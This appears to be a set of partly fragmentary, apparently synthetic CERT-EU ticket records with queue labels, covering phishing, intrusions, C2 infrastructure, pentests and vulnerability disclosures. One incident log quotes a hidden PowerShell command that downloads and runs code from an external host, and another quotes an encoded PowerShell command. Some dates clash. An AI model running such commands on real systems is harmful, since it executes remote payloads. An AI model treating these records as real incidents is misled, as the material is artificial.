We\u2019ve encountered a situation this morning that I believe needs your immediate attention and forensic expertise.\n\nAround 09:00 CET, our internal DLP (Symantec Endpoint) flagged repeated uploads of unusually large encrypted .7z archives from a workstation assigned to user \u201cklaudia.p\u201d (Europol Legal Affairs, Rotterdam office). The files were transferred to an external OneDrive account (not registered to our organization, domain: onedrive.live.com/?cid=bb2d8...\u2014full CID redacted for privacy). The DLP policy triggered because the file volume exceeded our threshold (over 2.2GB in less than 15 minutes), and the content appeared to contain structured document types typically handled by Legal but not in such bulk or frequency.\n\nI\u2019ve attached the relevant DLP incident report (see: DLP-INC-20240704-LEGAL.pdf) and snippets from the proxy logs. Of note:\n- Transfer timestamps: 08:48\u201309:03 CET\n- Source IP: 10.36.14.91 (rotterdam-legal-23)\n- User agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n- Destination: onedrive.live.com (external)\n- File names: legal_q2_casefiles.7z, clientlist_2024.7z, contracts_archive.7z\n\nOur SIEM (Splunk) shows that prior to the transfer, the user account accessed multiple restricted folders on the shared drive (\\rotterdam-legal\\casefiles\\confidential) and mounted an external USB device (VID_0951&PID_1666). There are also log entries suggesting the use of 7-Zip CLI (\"C:\\Program Files\\7-Zip\\7z.exe a ...\") executed via PowerShell at 08:45 CET. We\u2019ve preserved the full event logs, but didn\u2019t want to overload your inbox\u2014let me know if you need the raw .evtx files.\n\nWe have already disabled klaudia.p\u2019s AD account, removed her device from the network (host: rotterdam-legal-23), and started a disk image. Our HR and Legal teams have been looped in, and the local data protection officer is aware. We have not yet contacted the user directly, pending your advice.\n\nAt this stage, we\u2019re unsure if this is a case of intentional insider exfiltration, compromised credentials, or a legitimate transfer gone wrong. There\u2019s no prior history of DLP triggers for this user, and she\u2019s been with Europol for 6 years.\n\nRequesting your urgent guidance on next steps: should we proceed with user interview, notify Dutch authorities, and/or initiate full forensic triage? Also, do you recommend immediate notification under NIS2, or should we wait for more evidence?\n\nThanks in advance for jumping on this\u2014happy to coordinate a call this afternoon if needed.\n\nBest regards,\n\nJohan van Mechelen\nIT Operations Specialist\nEuropol HQ, The Hague\nitops@europol.europa.eu\nExt. 3247", "created_date": "2024-08-14T00:00:00", "email_address": "itops@europol.europa.eu", "assigned_queue": "DFIR::incidents"}

This morning, our endpoint monitoring (CrowdStrike Falcon) threw multiple medium-severity alerts from a cluster of virtual desktops used by the HR department here at the European Parliament (Strasbourg office). \n\nThe EDR flagged repeated outbound connections to 77.68.99[.]153 over port 443, which wasn\u2019t previously in our allow-list. Oddly, this traffic only triggers when staff log into our internal learning platform (moodle.ep-intra.eu). We haven\u2019t rolled out new plugins lately, and the web server hashes check out, so I\u2019m suspecting either credential theft or some rogue browser extension on user endpoints.\n\nWhat makes me nervous: the EDR sandbox classified a DLL dropped in %AppData%\\Roaming\\ as malicious (hash: 97fcb390d4a98721e879bdca5b67c61db2c1d5e2c6b01c9e2a776f5b54f45217). YARA scan flagged overlap with CobaltStrike beacon artifacts\u2014see attached screenshot. There\u2019s also some weird PowerShell invoking rundll32, spawning network connections post-login (T1059.001/T1218.011 if I\u2019m not mistaken).\n\nI\u2019ve contained affected VMs and kicked off password resets for the users, but it\u2019s unclear if this is part of a targeted campaign or just commodity malware. No ransom notes, no lateral movement yet, but our firewall logs show sporadic contact with another IP: 185.220.101[.]174, which came up in a MISP feed about six months ago (can\u2019t recall which campaign though\u2014maybe you have more context?).\n\nTimeline is tight: first event 07:13 CET, most recent 10:22 CET today (25 July). There\u2019s pressure to restore access for HR by tomorrow, so if you have enrichment on these IOCs, actor attribution, or even links to ongoing campaigns, I\u2019d appreciate anything you can share fast.

We\u2019ve run into a few snags during your ongoing cloud infrastructure pentest, specifically on our Azure-based pharmacovigilance environment (pv-cloud.ema.europa.eu). The engagement kicked off last Thursday, and so far, the communication\u2019s been smooth. However, since yesterday afternoon, we started seeing a series of security alerts and access lockouts, which have started impacting our data processing jobs and automated reporting workflows.\n\nTo be more precise: several VMs in the \u2018PV-Prod-EastEU\u2019 resource group began logging repeated failed RDP attempts and triggered conditional access policy blocks from 15:40 CET onward. The affected hosts are running the DataHarbor pipeline for real-time adverse event intake from national agencies. One instance (pv-intake-2.eastus.cloudapp.azure.com) was auto-quarantined by our Sentinel ruleset for over an hour, leading to a backlog in the EudraVigilance data feed. The cloud admin console also flagged temporary privilege escalation attempts (escalation to Owner role, denied) originating from IP 94.199.14.67, which I believe is within your stated pentest source range.\n\nI\u2019ve attached our Azure Security Center incident logs and a summary of Sentinel alerts for your review (see: ema-pentest-alerts_20240624.csv). No evidence of data leakage so far, but the workflow delays are raising questions from management, as we have daily reporting obligations to DG SANTE and national competent authorities.\n\nCould you confirm which privilege escalation and RDP brute-force vectors were exercised on these assets, and whether the observed lockouts were expected within the current test scope? If any tests are likely to trigger auto-quarantine or conditional access tripwires again, please advise so we can whitelist your traffic or temporarily adjust our controls. Also, if possible, please provide a short update on any critical findings so far, particularly relating to privilege management or Azure RBAC weaknesses.\n\nHappy to jump on a call if you need more context, or just reply with a quick summary.

Over the last 72 hours, our SIEM flagged a sequence of inbound connections from a previously unseen subnet (77.142.198[.]0/25) targeting our SAP Gateway instances. These attempts were logged outside standard business hours, with source geolocation mapping to Eastern Europe.\n\nFurther analysis revealed the connection attempts were accompanied by malformed RFC1006 packets, which triggered protocol parsing errors and subsequently generated several application-layer exceptions. We also observed repeated authentication failures using generic service accounts (e.g., \"sapadm_test\"), which is inconsistent with our normal access patterns. This activity coincides with recent advisories about exploitation of SAP vulnerabilities (notably CVE-2024-31245, mapped to MITRE ATT&CK T1190 \u2013 Exploit Public-Facing Application).\n\nWe\u2019ve attached a STIX 2.1 bundle (eca_sap_cti_20240628.json) containing the following:\n- Source IPs and timestamps for all anomalous connection attempts\n- SHA256 hashes of suspicious payloads extracted from packet captures\n- Observed user-agent strings and failed credential attempts\n\nAt this point, attribution is unclear, but there are TTP overlaps with recent \"Basilisk\" campaign reports (medium confidence).

The message claims to be from our regular vendor (\"EU Procurement Services\"), referencing an outstanding payment for services we did not request. The subject line reads: \"URGENT: Outstanding Invoice Payment Required\".\n\nUpon initial review, the email address (finance-operations@eu-procurement-services[.]eu) is very similar to our legitimate vendor's domain, but not an exact match. The message includes an attached PDF invoice (see attached) and requests immediate payment to a new IBAN account, supposedly due to 'updated EU banking regulations.'\n\nI double-checked our internal procurement records and could not find any matching service request or invoice number. Additionally, the tone of the email is more urgent than our usual vendor communications, and the signature block is missing standard contact details. The PDF attachment appears professional, but the bank account information is unfamiliar to our finance team.\n\nGiven the recent increase in targeted phishing and business email compromise incidents across EU institutions, I am concerned this could be an attempt to divert funds or collect sensitive financial information.

During our ongoing coursework on secure coding practices (MIM-IS-24), one of our postgraduate students, Adam Kowalczyk, uncovered a potentially serious vulnerability in the authentication logic of the EU\u2019s Open Data Portal mobile app (Android version, package: eu.europa.opendata.mobile). We\u2019ve double-checked the findings in a controlled lab environment and believe this merits responsible disclosure under your policy.\n\nSummary of issue:\nWhile reviewing the app\u2019s login flow, Adam noticed that the OAuth2 token endpoint (hxxps://api.opendata.europa.eu/mobile/v1/auth/token) accepts refresh tokens without properly validating the device identifier or session binding. In our tests, it was possible to reuse a valid refresh token from one device on another, resulting in unauthorized access to user-specific datasets. The endpoint does not appear to enforce device fingerprinting or IP correlation, nor does it check for revoked tokens after password changes.\n\nWe\u2019ve confirmed this by:\n- Logging in as a test user on Device A, capturing the refresh token via adb logcat (debug build, not production)\n- Replaying the refresh token from Device B, which then received a new access token and full user session\n- Accessing user-specific data (favorites, download history) from Device B without triggering any alerts or session invalidation on Device A\n\nPotential impact:\n- Account takeover if a refresh token is intercepted (e.g., via malware or insecure storage)\n- GDPR implications due to unauthorized access to personal usage data\n- Risk of session hijacking and data leakage, especially if users reuse weak passwords or devices are lost\n\nWe have not attempted to escalate privileges or access administrative endpoints. No production data was altered; all tests used student accounts created for this exercise. Screenshots and a step-by-step PoC (with sample API requests and responses) are attached as odp_mobile_token_flaw_uw2024.pdf.\n\nDisclosure preferences:\n- We are happy to coordinate with the relevant app development team and provide further technical details if needed\n- Please advise on your preferred process for involving the app vendor and any embargo period for public disclosure\n- Our group is available for a call or secure chat if you need clarification or want to validate the findings\n\nThanks for your attention.

We have not observed any signs of unauthorized access in the access logs so far, but we can\u2019t rule out the possibility that the URLs may have been discovered via search engine indexing or brute-force enumeration tools.\n\nTo verify the issue, we used the Azure Storage Explorer tool and a simple wget script to confirm that unauthenticated requests to the container endpoint (https://emsa-incidentcoordination-eu.blob.core.windows.net/ir-archive) were successful. As an example, the file \u201cincident-summary-2023-11-15.pdf\u201d was accessible without authentication. The container has since been set to private, but we are submitting this disclosure in accordance with the CERT-EU CVD policy to ensure that any similar misconfigurations across other EU agencies are checked and mitigated.\n\nWe have attached a brief technical summary, including screenshots and access logs, for your reference. Please let us know if you require additional details or would like us to perform further validation. We recommend reviewing cloud storage configurations across all agencies as a precaution, as these types of misconfigurations can be easily overlooked during rapid infrastructure changes.\n\nAppreciate your support and coordination on this. Happy to discuss further if needed.\n\nBest regards,\n\nMarta Ribeiro\nCloud Security Lead, EMSA\nmarta.ribeiro@emsa.europa.eu", "created_date": "2025-01-25T00:00:00", "email_address": "marta.ribeiro@emsa.europa.eu", "assigned_queue": "OFFSEC::CVD"}

The subject lines vary but typically read along the lines of \"Urgent: Confirm Your Account to Prevent Suspension\" or \"Security Alert: Unusual Activity Detected on Your LinkedIn Profile.\" The messages claim that our institutional LinkedIn accounts are at risk due to recent suspicious logins and instruct recipients to click a link to \"verify their identity and restore full access.\" The link is defanged here for safety: hxxps://eu-linkedin-security[.]com/verify.\n\nThe phishing site closely mimics the LinkedIn login portal and requests both username and password, as well as a phone number for supposed 'two-factor authentication reactivation.' The email body uses formal language and includes LinkedIn branding, but there are minor inconsistencies in the footer and a few grammatical errors (e.g., \"Your account may be terminated if not act promptly\").\n\nSo far, no staff have reported submitting any credentials, but one colleague did click the link before realising it was suspicious and immediately closed the page. We have advised all recipients not to interact with the message and to report any further incidents. I have attached screenshots of the phishing email and can provide the original .eml files with headers upon request for your forensic analysis.\n\nGiven the targeting of our official social media accounts and the potential reputational impact, we consider this a critical incident and would appreciate your guidance on any additional containment steps or user awareness measures. Please also advise if this campaign has been observed in other EU institutions and if there are updated advisories under NIS2 or GDPR regarding social media account compromise.\n\nThank you for your prompt attention to this matter.

To move forward, we kindly request guidance on the administrative steps required on your side for formal approval and travel arrangements for CERT-EU participants. In particular, could you clarify:\n\n- Whether a Memorandum of Understanding (MoU) or other formal agreement is needed for this type of event, and if so, what documentation you require from our university.\n- The preferred process for coordinating travel logistics and per diem arrangements for visiting staff (we understand this may need to be aligned with your internal HR and finance policies).\n- Any specific requirements for GDPR-compliant handling of attendee data, especially since we plan to circulate participant lists and session recordings for post-event analysis.\n\nWe have attached a draft agenda and a list of proposed speakers for your review. Please let us know if there are any internal forms or compliance checks that need to be completed ahead of time. Our administrative office is ready to provide any supporting documents you may need, including insurance certificates and campus security protocols.\n\nIf it would be helpful, we are happy to arrange a short coordination call next week to address any open questions.

The script ran under SYSTEM privileges\u2014very odd, as jblanc doesn\u2019t have local admin rights.\n\nHere\u2019s the relevant log snippet from [Sysmon]:\nEventID: 1\nUtcTime: 2024-06-22 10:19:08\nProcess: powershell.exe\nParentProcess: explorer.exe\nCommandLine: powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('hxxps://files-temp[.]xyz/Update-v4.3.exe')\"\n\nCrowdStrike Alert ID: 5578-EPHR-20240622\n\nInitial checks show a new local admin account ('svc_tempuser') was created within the same 2-minute window, which was not authorized by our team. The system also tried to disable Windows Defender via registry edits, as seen in [security.evtx]. No other endpoints have reported the same hash (SHA256: 2a3f4d\u2026b7e), but we\u2019re still running scans across the segment.\n\nWe have isolated hr-portal-02.ep.intra.eu from the internal network and disabled both the affected user and the rogue admin account. We\u2019re starting a full forensic image and have preserved the volatile memory dump. All logs are being collated for deeper analysis.\n\nGiven this seems like a possible initial compromise with privilege escalation, we\u2019d appreciate CERT-EU\u2019s immediate support for triage and containment. Could you advise on additional steps for system memory analysis or if we should notify the DPO at this stage?\n\nSorry for the quick note\u2014trying to contain before it spreads. Let me know if you need remote access or want the dump uploaded somewhere specific.\n\nThanks,\n\nSofia Dumitrescu\nIT Operations, European Parliament\nsofia.dumitrescu@ep.intra.eu", "created_date": "2025-02-14T00:00:00", "email_address": "sofia.dumitrescu@ep.intra.eu", "assigned_queue": "DFIR::incidents"}

At 14:13 CET, our monitoring tool (Oracle Audit Vault) flagged a series of SELECT and DUMP statements executed by user \u2018grant_review2\u2019 from IP 89.248.163.42 (unknown in our asset inventory). The queries targeted tables containing applicant personal data and project financials, and the pattern didn\u2019t match normal review workflows. There were 17 queries within 3 minutes, all outside of usual working hours for this user (normally 9:00\u201312:00 CET).\n\nI checked the user\u2019s login history in [db_audit.log] and saw that the last legitimate login was from our Brussels office subnet. This new access came from an IP geolocated in the Netherlands. The session used a user agent string I haven\u2019t seen before: \u2018NavicatPremium/16.1.10\u2019.\n\nWe\u2019ve disabled the \u2018grant_review2\u2019 account and exported the suspicious session logs. No evidence of DML or data modification so far, but there\u2019s a risk of data export (no obvious large transfer in [netflow], but can\u2019t rule out smaller exfil). No other accounts appear affected at this stage.\n\nCan you advise if further containment is needed? Do you want the full session trace or just the audit logs? Please let me know ASAP if you spot indicators of compromise.\n\nThanks,\nMark\u00e9ta\n\n---\n\nCan you follow up with Mark\u00e9ta and let us know if we need to escalate? Not urgent but seems off.\n\nBest,\n\nLucas Bernard\nIT Project Coordinator\nEducation, Audiovisual and Culture Executive Agency (EACEA)\nEuropean Commission", "created_date": "2025-01-30T00:00:00", "email_address": "lucas.bernard@eacea.europa.eu", "assigned_queue": "DFIR::incidents"}

Over the past two weeks, we have observed a notable decrease in user engagement metrics across our official EU campaign microsites and social media platforms. Upon deeper inspection, our technical team identified several suspicious referral patterns and anomalous traffic spikes originating from a cluster of domains previously flagged for disinformation and phishing activity (e.g., hxxps://eu-info-campaign[.]xyz, hxxps://news-update[.]eu-central[.]org).\n\nPreliminary log analysis (attached in CSV format, TLP:AMBER) indicates that these domains are leveraging automated bots to interact with our campaign assets, artificially inflating visit counts while simultaneously suppressing legitimate user interaction. Additionally, several fake accounts have been detected posting misleading comments and redirecting users to credential harvesting portals. We suspect this is part of a coordinated influence operation targeting EU institutional communications, potentially linked to the \"Black Sparrow\" campaign referenced in ENISA\u2019s April 2024 Threat Landscape Review.\n\nWe have implemented temporary IP filtering and enhanced user verification on affected platforms, but the adversaries appear to be rapidly rotating infrastructure and adapting their TTPs (MITRE ATT&CK T1585.001 \u2013 Establish Accounts: Social Media Accounts, T1566.002 \u2013 Spearphishing via Service). At this stage, attribution confidence is moderate, with indicators suggesting involvement of actors previously associated with disinformation efforts against EU policymaking bodies.\n\nCould CERT-EU assist by cross-referencing the attached IOCs (domains, IPs, sample account handles) with known threat actor profiles or recent CTI advisories? We are particularly interested in any overlap with nation-state-linked influence operations or supply chain compromise indicators affecting EU communications channels. Any guidance on long-term mitigation or detection strategies\u2014especially those compliant with NIS2 and GDPR\u2014would be highly appreciated.\n\nPlease let us know if you require additional logs, raw network captures, or further context on user reports.

About 30 minutes ago, our Prometheus DB monitoring dashboard started alerting for a sudden spike in SELECT and DUMP commands originating from user \u2018svc_dataops\u2019. That account is only supposed to be used by scheduled ETL jobs, but the access pattern is completely off\u2014multiple queries at odd intervals and targeting tables we don\u2019t usually touch (e.g. \u2018project_results_archive\u2019 and \u2018user_credentials_backup\u2019).\n\nHere\u2019s a sample log from [db_audit.log]:\n2024-07-26 16:12:37 CET | user=svc_dataops | action=SELECT * FROM user_credentials_backup | src_ip=10.119.4.27 | app=psql/12.7 | status=success\n2024-07-26 16:13:01 CET | user=svc_dataops | action=DUMP project_results_archive | src_ip=10.119.4.27 | app=psql/12.7 | status=success\n\nThe source IP (10.119.4.27) maps to a VM in our test subnet that shouldn\u2019t have access to production DBs. No one from my team initiated these actions and the scheduled jobs log (checked in Jenkins) is clean. I killed the svc_dataops session and disabled the account about 10 minutes ago, but the concern is whether data\u2019s already been exfiltrated. We don\u2019t see big outbound network spikes on the firewall, but not ruling out encrypted tunnels or staged exfil.\n\nWe\u2019re collecting a memory image and full audit logs now. Can you please advise ASAP on what else to preserve or whether to shut the box down entirely? If you want, I can send over the dump file hashes and session IDs. Please escalate if you spot any cross-tenant activity or lateral movement in the logs.

The timing of these events aligns with a recent sectoral alert regarding increased targeting of EU financial analysis systems by the threat actor cluster tracked as \"APT42-EU\" (see ENISA bulletin 2024-06-18).\n\nWe have exported a subset of relevant logs (attached: eca_sync_anomalies_20240627.csv), including:\n- Timestamps and source/destination IPs (defanged)\n- Unusual authentication attempts\n- Failed and partial data transfer events\n\nGiven the potential for cross-institutional targeting, we kindly request:\n1. Correlation of the provided IOCs with any ongoing APT42-EU campaigns targeting EU analytics platforms\n2. Enrichment of observed TTPs, especially regarding software version exploitation or protocol abuse\n3. Recommendations for additional monitoring, particularly in line with NIS2 and GDPR obligations\n\nPlease let us know if further data (PCAPs, full audit logs) would be useful for deeper analysis. We are treating this as a routine but important intelligence-sharing case, not a critical incident at this stage.

This is coming from the National Cyber Security Centre Finland (NCSC-FI), and while this isn\u2019t a critical incident on our end, the pattern seems broader than just our constituency.\n\nLast week (from 24/06 to 28/06), our honeypots and passive DNS sensors flagged repeated HTTPS traffic to a set of hosts with rapidly rotating subdomains under analytics-secure[.]cloud and coreauth-session[.]net. The servers are provisioned in short-lived AWS EC2 instances (mainly eu-west-1 and eu-north-1), with TLS certificates issued via ZeroSSL. We noticed the servers frequently presenting the JA3 fingerprint 769,47-4865-4866-49195-49199-49200-49196-49162-49172-156-157-47-53-10-255 (hash: 0a3d4b6ed7f58f7e02c1a7b7f96c3d2c), which matches previously observed CobaltStrike Beacon infrastructure in MISP events from late May.\n\nInitial investigation suggests the operators are leveraging Let\u2019s Encrypt API abuse for bulk certificate issuance, swapping out C2 endpoints every 8\u201312 hours. Some traffic observed over the last 72h also used HTTP/2 with the ALPN string \"h2\"\u2014unusual for their previous TTPs. Attached you\u2019ll find a CSV extract with the observed subdomains, timestamps, and ASN data (mostly AS16509, Amazon), as well as relevant TLS certificate serials. No payloads were recovered directly, but traffic patterns and the periodicity line up with known CobaltStrike malleable C2 profiles.\n\nWe have seen some correlation with indicators flagged in the recent ENISA TLP:GREEN alert (reference: ENISA-TI-2024-119), specifically around the coreauth-session[.]net cluster. There\u2019s moderate confidence that this infrastructure is being used for post-exploitation activity in recent attacks targeting EU ministries (though we haven\u2019t confirmed victimology yet).\n\nCould you:\n- Cross-check the attached subdomains, IPs, and JA3 hashes against your MISP and threat feeds for any actor overlaps?\n- Share if any other EU agency or partner has observed similar CobaltStrike C2 patterns in the last fortnight?\n- Advise on any detection signatures or enrichment for the ALPN and TLS artifacts?\n\nApologies for any typos\u2014writing this in a bit of a rush between meetings. Let me know if you need our full PCAPs or want to arrange a technical call.

The subject line reads: \"ECA Staff: Confirm Participation in Luxembourg Careers Forum 2024\". The message claims to be from \"EU Recruitment Services\" (email: careers@eu-talent[.]consulting), but neither the sender nor the domain matches any of our official partners or event organisers.\n\nThe email is quite well written and includes the ECA logo (copied from our public site, I think), and references the upcoming Careers Forum supposedly happening in Luxembourg next month. Recipients are asked to \"secure their spot\" by clicking a link labelled \"Confirm Attendance\". The URL (I didn't click, just hovered as our IT security training recommends) is hxxps://eca-careers[.]eu-forum[.]org/register (I've replaced the dots for safety). The landing page preview looks like a standard ECA login portal, requesting email credentials and, oddly, a mobile number for \"event verification\".\n\nI checked with our actual HR events coordinator and she confirmed that we have not organised any such forum, nor do we outsource event registrations to external domains. The email tries to create urgency by stating that \"only the first 50 respondents will be granted access\" and mentions that participation is \"mandatory for all ECA HR staff\". There's also a PDF attachment called \"Careers_Forum_2024_Info.pdf\" which I have not opened.\n\nSome red flags I noticed:\n- The reply-to address is different: eca-recruitment@eu-careers-support[.]org\n- The phone number in the signature is a generic Luxembourg mobile number, not our usual office line\n- The footer includes a strange disclaimer about \"GDPR-compliant data processing for event participants\"\n\nNo one here has reported entering their credentials, but several colleagues were about to respond before I sent out an internal warning. I\u2019ve attached the original .eml file (with headers) and a screenshot of the email. We\u2019ve also reported it internally via our usual process, but I wanted to escalate to CERT-EU as I suspect this could be a targeted phishing campaign against ECA HR personnel, maybe to harvest credentials or personal data.\n\nCould you please confirm if this domain or campaign matches any known phishing operations targeting EU institutions? Is there any additional action you recommend (e.g. blocking the sender domain, user notification, further investigation)? We\u2019re reviewing access logs for any suspicious login attempts from outside the EU, but nothing obvious so far.\n\nSorry for the long message \u2013 just want to make sure we\u2019re handling this correctly.

Over the past six weeks, our monitoring systems have flagged a notable uptick in highly customised phishing emails leveraging spoofed project collaboration SaaS platforms, particularly those impersonating \"EuroSync Projects\" and \"PlanMaster EU\".\n\nThe emails typically originate from recently registered domains such as hxxps://eu-sync[.]services and hxxps://planmaster-login[.]net, with sender addresses mimicking legitimate institutional contacts.

Several of the phishing kits observed mimic legitimate login portals, employing MITRE ATT&CK techniques T1192 (Spearphishing Link) and T1114.002 (Email Collection: Remote Email Collection). We estimate, based on log correlation, that at least 17 staff accounts across three DGs attempted to authenticate via these spoofed portals, though to date, we have contained and reset all affected credentials.\n\nWe would appreciate:\n1.

This is highly unusual for this account, which only runs backup scripts via Task Scheduler.\n\nBelow are relevant snippets from [Sysmon] and SentinelOne logs:\n\n[2024-07-23T21:42:16Z] eca-hrfs-04 | PowerShell.exe | User: svc_hrbackup | Parent: taskeng.exe | Command: powershell.exe -e SQBmACgAKABHAGUAdAAtVQBzAGUAcgAgACkALgB...

We checked the scheduled tasks and found that the legitimate backup job was not due until 03:00, and there are no signs of recent changes to the backup scripts. The event logs show a successful logon for \u2018svc_hrbackup\u2019 from an IP not in our usual admin subnet (172.21.19.44) at 21:41:57, which geolocates to outside our internal network range.\n\nWe have disabled the service account, isolated the affected server from the network, and are currently collecting memory dumps and full event logs. No evidence so far of lateral movement to other HR systems, but we are still reviewing [eventlog.evtx] and our SIEM for any signs of data access or further privilege escalation.\n\nPlease advise if you require the full memory image or if there are specific indicators you want us to search for. Also, do you recommend resetting all service accounts as a precaution? Our HR data is highly sensitive, so we\u2019re treating this as a potential breach.\n\nLet me know if you need additional info or remote access for deeper forensics. Sorry for the late-night escalation, but we didn\u2019t want to risk waiting until morning.\n\nBest regards,\n\nHugo M\u00fcller\nIT Systems Administrator\nEuropean Court of Auditors\nhugo.muller@eca.europa.eu", "created_date": "2024-07-19T00:00:00", "email_address": "hugo.muller@eca.europa.eu", "assigned_queue": "DFIR::incidents"}

The firewall logs ([auth.log] excerpt attached) show multiple successful connections to our VPN gateway (vpn-gw01.ec.europa.eu) using privileged campaign admin accounts, some of which occurred outside normal operating hours and from geolocations not previously associated with our staff. Notably, session tokens for user 'user_campA' were issued simultaneously from two distinct locations (Brussels and Madrid), raising concerns of possible credential compromise.\n\nOur SIEM (Splunk) also generated alerts for unusual inbound traffic patterns targeting TCP port 8443 and a spike in failed authentication attempts across our web application firewall.

Around 18:00 CET, our EDR (using SentinelOne) started throwing off high-severity alerts across several VDI hosts in our Brussels data centre. The suspicious activity was traced back to an unexpected child process spawned by vmtoolsd.exe, which is pretty odd in itself, especially since the parent process chain didn't match any of our established baselines.\n\nThe sequence involved an unsigned DLL (sha256: f0b8e61e1d72e4db1e8b1a8c9d9d2f017...3a7c) being sideloaded, followed by outbound traffic over TCP 443 to hxxps://update-pollination[.]org, which isn't on any of our whitelists and has a registration date of less than a week ago. The destination IP (94.23.19.241) is flagged in two threat feeds (Cisco Talos and AbuseIPDB) for recent C2 activity. Initial traffic analysis suggests the use of TLS 1.2 with some non-standard JA3 fingerprints (b07d12e573a6b5c5d2b1f0c2e9d011f3), which we\u2019ve not seen in our environment before. The process tree also showed a rapid registry modification (HKLM\\Software\\Wow6432Node\\Policies\\Microsoft\\Windows\\System\\) that disabled local AV notifications temporarily.\n\nWe have isolated the affected VDI hosts and are pulling forensic images now, but early signs point to a possible zero-day exploit in the underlying hypervisor stack.

Our vendor says this could be abused for server-side request forgery or even remote code execution, depending on the deployment context. They provided a sample file (not attached here for safety\u2014let me know if you want it sent via a secure channel) and a brief write-up on how they stumbled across this during regression testing. No exploitation has been observed in production, and the preview service is firewalled, but it does have outbound internet access for some legacy workflows.\n\nWe\u2019ve temporarily disabled document previews for untrusted uploads as a precaution. Our IT team is reviewing logs from the past 30 days for any suspicious activity but hasn\u2019t found anything yet. The vendor mentioned that PDFBox maintainers were notified earlier this week, but there\u2019s no official CVE or patch as of today. They\u2019re also checking if any other EU agencies are using similar setups.\n\nCould you advise on the next steps for coordinated disclosure? Should we wait for an upstream fix, or are there interim mitigations you recommend? Also, is there a CERT-EU process for sharing the technical PoC securely with your analysts? We\u2019d appreciate any guidance, especially if this could affect other institutions relying on PDFBox or similar libraries for file handling.\n\nSorry for the slightly messy forward\u2014just wanted to get this on your radar ASAP. Let me know if you need direct contact with the vendor\u2019s security lead or our internal IT folks.\n\nBest regards,\n\nJeroen van Dijk\nService Delivery Coordinator\nPublications Office of the European Union\njeroen.vandijk@op.europa.eu", "created_date": "2024-11-20T00:00:00", "email_address": "jeroen.vandijk@op.europa.eu", "assigned_queue": "OFFSEC::CVD"}

During a recent review of our deployment (honestly, just double-checking some access policies), I noticed something odd that might be a security issue, so I wanted to flag it for your team as per the CVD process.\n\nBasically, we\u2019re using a third-party HR portal (hrcloud.ema.europa.eu) that integrates with our Azure AD for authentication. While reviewing the audit logs, I found several entries where users with only basic employee roles were able to access the admin API endpoints\u2014specifically, /api/v2/export-users and /api/v2/audit-logs. I tried it myself (I have a test account with regular user permissions), and sure enough, I could retrieve a full export of user profiles, including email addresses, department info, and in some cases, hashed passwords. The API just responds with a big JSON file\u2014no error, no access denied, nothing. \n\nI haven\u2019t poked around further (not my area, and I don\u2019t want to overstep), but this seems like a classic broken access control or maybe an API misconfiguration? I checked with our vendor\u2019s support, but they said it\u2019s probably a permissions sync issue and to check our SSO claims mapping. Still, I\u2019m worried because this API is exposed to the public internet, and the logs show some requests coming from IPs outside our usual range (could be legit remote staff, but hard to say).\n\nI\u2019m attaching a few redacted screenshots of the API responses and a snippet of the audit log (see attached: api_access_issue_ema.txt).

This is mainly a status update and a few questions that have come up during the ongoing test. \n\n-----Original Message-----\nFrom: Bart Dierckx <bdierckx@cybershield.be>\nSent: Tuesday, 2 July 2024 09:38\nTo: Annika Lehtinen <annika.lehtinen@jrc.ec.europa.eu>\nSubject: JRC Geel - Wi-Fi PenTest Progress & Questions\n\nDear Annika,\n\nAs part of the authorised wireless penetration testing engagement for the JRC Geel campus (per contract JRC-SEC/2024/07-WIFI), we\u2019ve completed our initial reconnaissance and begun targeted attacks against both the staff and guest Wi-Fi networks (SSID: JRC-STAFF and JRC-GUEST). Testing has been coordinated per the scope you provided, with all activities confined to the agreed subnets (10.220.35.0/24 and 10.220.36.0/24).\n\nTo date, we\u2019ve identified several access points broadcasting with outdated firmware (specifically 2x Aruba 515 running v8.7.1.2), which may be susceptible to published CVE-2023-21692. No successful exploits have been achieved yet, but we\u2019re seeing WPA2 handshake captures on JRC-GUEST, with one instance of weak PSK usage detected (password entropy only 28 bits). Brute-force attempts are ongoing; so far, nothing cracked, but we recommend immediate PSK review.\n\nAdditionally, we observed that MAC filtering is inconsistently enforced\u2014one access point allowed us to associate using a spoofed address outside the campus allocation. We have not yet attempted lateral movement or internal resource access from the guest VLAN, pending your go-ahead.\n\nAre you able to confirm whether guest VLAN segmentation is enforced at the switch level, or only at the controller? We\u2019d also appreciate a temporary whitelist for our test laptop (MAC: 00:16:EA:12:3F:99) to expedite payload delivery testing next week.\n\nPlease advise if you want us to prioritise any particular attack vectors or if there are segments strictly off-limits. We are maintaining full logs of test activity (see: JRC_WiFi_Pentest_Progress_20240702.csv), which can be shared upon request.\n\nRegards,\nBart\n\n-----\n\nLet me know if you need more info or want a quick call to go over any of this. Our next review session is Friday. Happy to coordinate with the OffSec team directly if that\u2019s easier.\n\nBest,\nAnnika\n\nAnnika Lehtinen\nIT Operations Manager, JRC Geel\nannika.lehtinen@jrc.ec.europa.eu", "created_date": "2025-01-27T00:00:00", "email_address": "annika.lehtinen@jrc.ec.europa.eu", "assigned_queue": "OFFSEC::Pentesting"}

Earlier today, several colleagues and I received an email purporting to be from \"EU Health Portal IT Support\" (sender: it-support@ehealth-eu[.]com) regarding an urgent \"compliance audit\" for GDPR/NIS2 purposes. The message requested immediate verification of access credentials to avoid suspension of our medical data accounts, referencing recent updates to Elasticsearch indexing and platform stability.\n\nThe subject line was: \"Action Required: Confirm Access to EMA Medical Records Database\". The body included a link to what appears to be a lookalike login portal (defanged: hxxps://ema-access[.]secure-euhealth[.]org), mimicking our legitimate authentication page but with subtle layout and language differences. It also warned that data access could be delayed or revoked if action was not taken by end of day. At least two staff members clicked the link, though it is unclear if credentials were submitted. Notably, after these emails, some users experienced delays and timeouts when accessing medical data, which was initially assumed to be a technical issue with Elasticsearch. System restarts and CPU monitoring did not resolve the issue, leading us to suspect a link between the phishing attempt and the observed service disruption.\n\nI have attached screenshots of the phishing email, along with a sample of affected HTTP access logs (redacted for privacy) showing several failed authentication attempts from unfamiliar IP addresses (outside usual EU ranges) immediately after the emails were received.

Initially, we suspected a server overload, but further investigation revealed that multiple users had received an unexpected email purportedly from the \"EU Procurement Office\" with the subject line: \"Important: Outstanding Invoice \u2013 Immediate Action Required\".\n\nThe sender's address is invoices@eu-procurement[.]eu, which does not match any official EC domain.

